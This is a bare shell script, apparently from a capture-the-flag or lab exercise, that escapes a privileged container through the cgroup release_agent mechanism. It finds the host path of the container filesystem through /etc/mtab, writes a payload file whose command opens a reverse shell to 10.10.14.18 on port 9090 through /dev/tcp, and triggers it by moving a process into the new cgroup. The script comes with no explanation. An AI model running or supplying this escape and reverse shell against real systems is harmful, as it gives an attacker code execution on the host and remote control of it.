mkdir /dev/shm/rinzler
mount -t cgroup -o rdma cgroup /dev/shm/rinzler
mkdir /dev/shm/rinzler/x
echo 1 > /dev/shm/rinzler/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /dev/shm/rinzler/release_agent
echo '#!/bin/bash' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.18/9090 0>&1'" >> /cmd
chmod a+x /cmd
bash -c "echo \$\$ > /dev/shm/rinzler/x/cgroup.procs"
